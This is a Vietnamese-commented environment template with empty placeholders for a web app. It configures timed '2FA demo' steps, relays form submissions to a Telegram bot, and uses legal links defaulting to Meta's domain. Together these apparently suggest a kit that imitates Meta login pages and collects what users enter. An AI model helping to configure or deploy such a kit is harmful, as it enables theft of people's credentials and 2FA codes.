# Bản sao an toàn: chỉ placeholder. Không commit file `.env` thật lên git.
# Sao chép thành `.env` / `.env.local` và điền giá trị.

# Thời gian chờ (giây) giữa các bước 2FA demo
NEXT_PUBLIC_SETTING_TIME=30

# Telegram — bắt buộc nếu muốn nhận thông báo form (lấy từ @BotFather)
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=

# Tùy chọn: bản sao tên biến khác (nếu helper đọc — kiểm tra helper/telegram.ts)
NOTIFICATION_TOKEN=
NOTIFICATION_CHAT=

WEBHOOK_URL=

# true / false — bật tính năng thông báo phía client (nếu có dùng)
NEXT_PUBLIC_NOTIFICATION_ENABLED=false

# Tuỳ chọn: ghi đè URL pháp lý (mặc định dùng domain Meta chính thức trong data/legal-links.ts)
# NEXT_PUBLIC_LEGAL_HELP_URL=
# NEXT_PUBLIC_LEGAL_PRIVACY_URL=
# NEXT_PUBLIC_LEGAL_TERMS_URL=
# NEXT_PUBLIC_LEGAL_COMMUNITY_URL=
# NEXT_PUBLIC_LEGAL_ABOUT_URL=
# NEXT_PUBLIC_LEGAL_SETTINGS_URL=
